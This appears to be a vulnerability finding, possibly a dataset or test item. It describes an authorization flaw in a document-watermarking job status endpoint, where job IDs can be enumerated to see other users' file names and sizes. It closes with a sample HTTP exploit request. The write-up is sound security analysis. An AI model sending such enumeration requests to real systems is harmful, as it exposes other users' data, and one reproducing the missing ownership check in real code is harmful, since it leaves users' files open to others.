diagnosis: The status endpoint queries Bee-Queue for document watermarking progress by jobId without checking if job.data.userId matches req.user.id. Any authenticated user can enumerate job IDs to monitor document processing and discover file names and sizes uploaded by other users.
exploit_request:
GET /api/documents/watermark-jobs/77819 HTTP/1.1
Host: docprocess.corp.com
Authorization: Bearer <authenticated_user_jwt>
